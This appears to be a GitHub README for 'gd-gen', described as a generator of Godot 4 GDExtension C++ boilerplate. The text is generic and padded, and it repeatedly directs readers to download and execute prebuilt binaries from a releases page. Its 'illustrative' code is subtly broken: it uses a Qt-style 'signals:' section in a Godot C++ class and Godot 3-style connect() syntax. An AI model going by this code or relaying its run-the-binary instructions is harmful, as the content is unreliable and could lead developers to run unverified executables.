# gd-gen: Auto-Generate Godot C++ Code with UE5-Inspired Reflection

[![Release](https://img.shields.io/badge/Release-v1.0.0-green)](https://github.com/anndomelas12/gd-gen/releases) [![License](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)

See releases at https://github.com/anndomelas12/gd-gen/releases

gd-gen is a code generation tool for Godot's C++ GDExtension system. It automates boilerplate so you can focus on game logic. It brings a reflection-like workflow to Godot, inspired by Unreal Engine 5 patterns. The goal is to reduce manual coding and keep projects consistent across teams.

Emojis often help convey the vibe here: ⚙️, 🧭, 🚀, 🧩, 🛠️

Overview
- What it does: Generates C++ boilerplate for Godot nodes, properties, signals, and common patterns. It helps you define your class interface in a compact, repeatable way and then emits the full C++ code that Godot can load as a GDExtension.
- Why it matters: Godot’s native extension system requires repetitive boilerplate to expose properties, signals, and methods. UE5 users feel a familiar workflow via reflection and metadata; gd-gen brings a similar discipline to Godot without locking you into a rigid framework.
- Who it’s for: Godot developers who write C++ modules or extensions and want faster iteration, better consistency, and a clean separation between design and implementation.

How gd-gen works
- Template-driven generation: You describe your class and its members in a declarative format. The generator reads the description and emits the corresponding C++ source and header files.
- Metadata and reflection: The tool emits Godot-friendly metadata for properties and signals. This makes the editor UI simpler to read and keeps runtime behavior predictable.
- Safe integration with GDExtension: Generated code follows the official Godot extension conventions, enabling clean builds with scons or your usual toolchain.
- Extensible templates: You can customize templates to adjust naming conventions, include order, or how metadata appears in the generated code.
- Cross-version support: The generator targets Godot 4.x and remains compatible with typical Godot extension patterns. It adapts to changes in the GDExtension API as needed.

Features
- Automatic generation of C++ boilerplate for Godot nodes
- Reflection-like metadata for properties, signals, and methods
- Template-driven customization to fit team conventions
- Smooth integration with Godot’s GDExtension workflow
- Lightweight and deterministic output for reproducible builds
- Easy upgrade path when Godot or the extension API changes
- Clear separation between interface and implementation

Getting Started
Before you begin, you can visit the releases page for ready-made setup options. See releases at https://github.com/anndomelas12/gd-gen/releases

Prerequisites
- A Godot project that uses GDExtension (Godot 4.x is common for modern extensions)
- A C++ toolchain appropriate for your platform (GCC/Clang on Linux/macOS, MSVC on Windows)
- SCons installed (the project uses it to build C++ code)
- Basic familiarity with Godot’s GDExtension workflow
- Internet access to pull the generator and templates if you choose to fetch them from the repository

Installation options
- From source: clone this repository and build with scons. This gives you the latest generator and templates.
- From releases: download a prebuilt binary for your OS and run it directly. The releases page hosts the binaries you need.

See releases at https://github.com/anndomelas12/gd-gen/releases

Quick start
1) Install prerequisites
- Install Godot 4.x locally
- Install a C++ toolchain (GCC/Clang for Linux/macOS, MSVC for Windows)
- Install SCons
- Ensure your PATH includes your toolchain and scons

2) Install or build gd-gen
- From source: clone the repository and run the build command as described in the repo’s docs.
- From releases: download the binary matching your OS. The release assets include a file named gd-gen-<os>-x64 (or gd-gen-<os>.exe on Windows). You must download the appropriate file and execute it.

3) Run the generator
- If you downloaded a binary, give it execute permissions if needed and run it with the target project path. A typical command might look like:
  ./gd-gen-linux-x64 ../my-godot-project
  or
  gd-gen-windows-x64.exe ..\my-godot-project

4) Inspect the output
- The generator emits C++ headers and source files into your project’s designated directory.
- Open the generated files to review boilerplate for properties, signals, and binding code.
- Integrate the generated code with your Godot module or GDExtension build setup.

From the Releases page
- The releases contain prebuilt binaries for major platforms. Download the one that matches your OS.
- After downloading, make the file executable if needed and run it against your Godot project.

Structure of this README
- This document is organized to help you go from zero to productive quickly.
- It covers the design philosophy, how to use the tool, how to customize templates, and how to contribute.
- It also explains how to interpret generated code and how to debug issues that may appear during generation or build.

Why gd-gen exists
- Godot’s extension system is powerful but verbose. Exposing properties and signals by hand can slow you down.
- UE5 offers a mature reflection approach; games benefit from automatic boilerplate that makes it easy to inspect, modify, and extend class data.
- gd-gen brings this spirit to Godot. It emphasizes clarity, repeatability, and small, predictable changes that don’t break builds.

Design goals
- Reliability: Generated code should compile cleanly across common platforms.
- Clarity: The output is readable and well-documented in code comments.
- Extensibility: Templates are easy to modify to fit different project styles.
- Compatibility: The tool aligns with Godot’s GDExtension workflow, minimizing surprises during builds.

Project layout and how to navigate
- Generator core: The main engine that parses your class description and emits C++ files.
- Template system: A set of templates used to emit code. You can replace or modify these to match your coding standards.
- Output directory: The location where generated C++ files land. Configure this to fit your project layout.
- Examples: A directory with sample inputs and outputs to help you understand how to structure your descriptions and what the generated files look like.

How to describe a class to the generator
- A class declaration describes the class name, base type, and a list of properties, signals, and methods.
- Each property includes a type, a name, and optional metadata such as a default value or a hint (for the editor).
- Signals declare their name and the arguments they carry, including types and default values if applicable.
- Methods define signature and whether they are exposed to Godot’s scripting interface.

Example concept (not copy-paste)
- You provide a description like:
  - ClassName: MyActor
  - Base: Node
  - Properties: health (int, default 100), speed (float, default 5.0)
  - Signals: health_changed(new_health: int)
  - Methods: take_damage(amount: int), set_speed(new_speed: float)

- The generator emits:
  - A C++ class MyActor that inherits from Node
  - A Godot-exposed property for health and speed with appropriate getters and setters
  - A signal health_changed that is emitted on health changes
  - Exposed methods that Godot can call from scripts

Templates and customization
- Templates define how code is emitted. You can adjust naming conventions, comments, and the inclusion order.
- Custom templates allow you to tailor the output to your team’s style guide.
- Changes to templates apply to all generated code, ensuring consistency across the project.

File generation workflow
- Step 1: Collect class descriptions from your source (YAML, JSON, or a custom DSL).
- Step 2: Validate descriptions to catch obvious errors (missing types, invalid names).
- Step 3: Run the generator to emit header and source files.
- Step 4: Integrate emitted files into your Godot GDExtension project.
- Step 5: Build the project with scons and test in Godot.

Configuring the generator
- Command-line options:
  - --input: Path to the description file
  - --output: Output directory for generated code
  - --template: Path to a custom template directory
  - --godot-version: Target Godot version (e.g., 4.x)
- Environment variables:
  - GDEGEN_TEMPLATES: Path to templates
  - GDEGEN_OUTPUT: Default output directory

Advanced topics
- Custom properties with hints: You can specify hints for the Godot editor, such as range, step, or enum options.
- Signals with payloads: Design signals with typed payloads so scripts can respond precisely.
- Editor integration: Generated code includes editor hints so the Godot editor shows proper controls for properties.
- Versioning strategy: The generator supports version annotations in your descriptions to help you migrate between Godot versions smoothly.

Using the generator with Godot
- Add the generated files to your GDExtension module or to your Godot project as appropriate.
- Ensure your C++ build system includes the generated headers and sources.
- If you use SCons, rebuild the project to pick up the new code.
- Run your Godot project and verify that properties appear in the editor, signals emit at the right times, and methods respond to calls.

Best practices
- Start with a minimal, testable class: a simple node with one property and one signal. Verify the generated output compiles and runs.
- Keep descriptions small and focused: complex class descriptions can lead to confusing generated code.
- Use templates to enforce consistency: a single place to adjust style and conventions.
- Regularly run the generator during development to catch drift between your template and the output.
- Maintain a small set of description examples in a dedicated directory to illustrate common patterns.

Code examples you might see
- Generated header snippet (illustrative):
  class MyActor : public Node {
    GDCLASS(MyActor, Node);
  public:
    MyActor();
    void set_health(int health);
    int get_health() const;

  signals:
    void health_changed(int new_health);

  protected:
    static void _bind_methods();

  private:
    int m_health;
    float m_speed;
  };

- Generated source snippet (illustrative):
  void MyActor::_bind_methods() {
    ClassDB::bind_method(D_METHOD("take_damage", "amount"), &MyActor::take_damage);
    ADD_PROPERTY(PropertyInfo(Variant::INT, "health"), "set_health", "get_health");
    ADD_SIGNAL(MethodInfo("health_changed", PropertyInfo(Variant::INT, "new_health")));
  }

- Example usage in Godot script (GDScript) after binding:
  var actor = MyActor.new()
  add_child(actor)
  actor.connect("health_changed", self, "_on_health_changed")
  actor.health = 120

Usage patterns and common pitfalls
- Pitfall: mismatched types between the description and the actual code.
  Solution: Validate types early and rely on the generator’s type system to catch mismatches.
- Pitfall: forgetting to register the class in the module’s entry point.
  Solution: Ensure the class is registered in the _bind_methods function and exported correctly in the module.
- Pitfall: large projects with many generated files can make builds slow.
  Solution: Generate once, then incrementally rebuild as you add more nodes. Use template-driven changes to minimize churn.

Testing and quality assurance
- Unit tests: Write tests that generate code for a small set of class descriptions and verify the emitted files compile with your toolchain.
- Integration tests: Build a small Godot project that uses a generated class and run Godot in headless mode to exercise property changes and signal emissions.
- Linting: Run a C++ linter on the generated output to enforce coding standards.
- Regression tests: Keep a baseline set of generated outputs and compare against new outputs when you run the generator with updates.

Continuous integration
- Use a CI workflow to validate:
  - Generator builds from source
  - Generated code compiles with the target Godot GDExtension toolchain
  - A minimal Godot project using a generated class loads and runs basic scripts
- CI should exercise multiple platforms if possible (Linux, Windows, macOS) to catch platform-specific issues.

Contributing
- You are welcome to contribute templates, description formats, or bug fixes.
- The project uses a straightforward patch workflow:
  - Fork the repository
  - Create a feature branch
  - Implement changes
  - Run tests locally
  - Open a pull request with a clear description of what changed and why
- Please follow the project’s coding standards and maintain the readability of generated output.

Releases and installation
- For the easiest setup, use the prebuilt binaries from the releases page. See releases at https://github.com/anndomelas12/gd-gen/releases
- If you prefer building from source, follow the installation steps in the Getting Started section. The source distribution includes the generator and templates.
- From the releases page, download the file named gd-gen-linux-x64, gd-gen-macos-arm64, or gd-gen-windows-x64.exe, depending on your platform. This file should be downloaded and executed.
- After download, make the binary executable if required (for example, chmod +x gd-gen-linux-x64) and run it against your Godot project to generate the code.

Templates and customization playground
- A good way to learn is to modify a small template and run the generator against a tiny example.
- Create a local templates directory and point the generator to it with the --template option.
- Try changing how properties are declared or how signals are named. You will see immediate changes in the emitted code.
- If you want to revert to the default templates, remove your custom path or point to the default templates shipped with the generator.

Architecture and internals
- Core parser: Reads a description file and builds an in-memory model of the class to generate.
- Template engine: Applies the model to code templates to produce header and source files.
- Output manager: Handles the file system operations, including path resolution, file writing, and overwrites.
- Validation layer: Checks for missing types, invalid names, or conflicts with existing project code.
- Plugin surface: Allows you to plug in extra steps, such as custom code emit for additional Godot features.

API surface for developers
- The generator exposes a small API for advanced users who want to integrate it into larger build systems.
- Typical usage involves:
  - Loading a description
  - Running validation
  - Invoking the template engine
  - Writing the results to disk
- The API remains stable across minor versions to minimize disruption to existing projects.

Security and safety considerations
- The generator processes local description files; ensure those descriptions come from trusted sources.
- Generated code should be inspected before committing to a shared repository.
- Do not run the generator with elevated privileges on untrusted code.

Documentation and learning resources
- The repository includes a suite of examples illustrating common patterns.
- A separate docs directory contains the format specification, template references, and troubleshooting tips.
- There are example projects showing how to integrate generated code into a Godot GDExtension setup.

FAQ
- Q: What is gd-gen best used for?
  A: It speeds up the creation of Godot GDExtension code by generating boilerplate for properties, signals, and common patterns.
- Q: Does gd-gen support Godot 3.x?
  A: The current focus is on Godot 4.x with GDExtension. Some concepts may apply to earlier versions, but validation is tailored for the modern extension workflow.
- Q: Can I customize the generated code?
  A: Yes. Use templates to control how code is emitted. You can tailor naming, comments, and metadata formatting.
- Q: How do I report a bug?
  A: Open an issue on the repository with a clear description of the problem, steps to reproduce, and the environment details.

Changelog (high level)
- This section captures notable improvements and fixes across versions. Use the Releases page for detailed notes per version.

Community and support
- You can reach out to the project maintainers via the repository’s issue tracker.
- Engage with other users by sharing your templates and examples, so the community benefits from shared patterns.

License
- This project is licensed under the MIT License. See LICENSE for details.

Acknowledgments
- Thanks to the Godot community for designing a robust extension system.
- Thanks to UE5 for inspiration on reflection and metadata patterns.
- Thanks to contributors who helped with templates and real-world testing.

Releases (quick reference)
- The most recent binaries are hosted on the Releases page. See releases at https://github.com/anndomelas12/gd-gen/releases
- Download the appropriate binary for your OS, extract if needed, and run it against your Godot project to generate code.

Code of conduct
- The project follows a respectful, inclusive policy. Treat others with courtesy and keep discussions constructive.

License and legal
- MIT License text is included in the repository. You may use, modify, and distribute the software as permitted by the license.

End of document

